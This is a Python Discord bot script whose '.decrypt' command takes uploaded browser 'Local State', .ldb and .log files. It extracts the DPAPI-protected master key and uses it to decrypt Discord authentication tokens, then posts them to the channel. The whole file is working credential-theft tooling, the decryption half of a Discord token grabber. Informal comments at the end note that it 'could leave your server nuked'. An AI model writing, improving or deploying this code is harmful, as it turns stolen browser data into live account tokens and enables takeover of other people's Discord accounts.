import discord
from discord.ext import commands
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import path, listdir, makedirs
from json import loads
from regex import findall

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception as e:
        return "An error has occurred.\n" + str(e)

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')

@bot.command(name='decrypt')
async def decrypt_token(ctx):
    if not ctx.message.attachments:
        await ctx.send("Please provide the ldb and log files along with the local state.")
        return

    if not path.exists('uploads'):
        makedirs('uploads')

    for attachment in ctx.message.attachments:
        file_path = path.join('uploads', attachment.filename)
        await attachment.save(file_path)

    key = None
    for file in listdir('uploads'):
        if 'Local_State' in file:
            with open(path.join('uploads', file), 'r') as state_file:
                local_state_data = loads(state_file.read())
                key = local_state_data.get('os_crypt', {}).get('encrypted_key')

    if key is None:
        await ctx.send("Error: Could not find the encrypted key in the provided Local State file.")
        return

    embed = discord.Embed(title="Decrypted Tokens", color=0x00ff00)

    for file in listdir('uploads'):
        if file.endswith((".ldb", ".log")):
            tokens = []
            try:
                with open(path.join('uploads', file), 'r', errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            tokens.append(values)
            except PermissionError:
                continue

            for token in tokens:
                decrypted_token = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                embed.add_field(name="Token", value=decrypted_token, inline=False)

    if not embed.fields:
        await ctx.send("No tokens found in the provided files.")
    else:
        await ctx.send(embed=embed)

bot.run('YOUR BOT TOKEN EHRE')
# I DIDNT USE HAMZAT MODULE BEACUSE YOU COULD RUN IT ON REPLIT
# THIS COULD LEAVE YOUR SERVER NUKED, I USED WIN32API.. REPLACE YOUR BOT TOKEN 2 LINES ABOVE
# INORDER TO DECRYPT YOU NEED TO PROVIDE ALL FILES EXCLUDING ZIP, ONLY THE LOCALSTATE, LDB AND LOG FILES

